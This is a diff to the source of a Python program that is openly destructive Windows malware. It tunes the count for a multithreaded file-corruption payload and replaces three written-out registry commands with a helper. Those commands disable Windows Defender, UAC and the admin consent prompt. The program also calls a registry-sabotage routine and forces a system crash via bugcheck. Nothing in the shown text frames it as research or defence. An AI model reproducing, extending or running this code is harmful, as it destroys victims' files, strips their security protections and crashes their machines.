@@ -10,9 +10,10 @@ from functions import *
 #inten = 8*1000 #corruption intensity ##Unused
 debug = True #console log stuff
 do_destruction = False
-skipCorruption = False
+skipCorruption = True
 admCheck = ctypes.windll.shell32.IsUserAnAdmin()
 threadAmount = 256
+pcLoadAmount = 819
 
 
 
@@ -39,9 +40,7 @@ if do_destruction:
         except:
             print('bruh')
     try:
-        do_command('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
-        do_command('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f')
-        do_command('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f')
+        ripDefender()
     except:
         print('failed to get permissions')
 
@@ -51,7 +50,7 @@ if do_destruction:
         #bunch of threads for corruption payload to go faster
         threadList = []
         for thread in range(threadAmount):
-            thr = threading.Thread(target=fileCorruptionPload, args=(admCheck, debug, round(3200/threadAmount), thread))
+            thr = threading.Thread(target=fileCorruptionPload, args=(admCheck, debug, round(pcLoadAmount/threadAmount), thread))
             threadList.append(thr)
             thr.start()
             print('Started thread with id:' + str(thread))
@@ -67,7 +66,7 @@ if do_destruction:
 
     if admCheck != 0:
         # try to do funny
-        regFuck()
+        regFuck(admCheck)
         Bugcheck(0xC0000022)
     else:
         Bugcheck(0xC0000022)
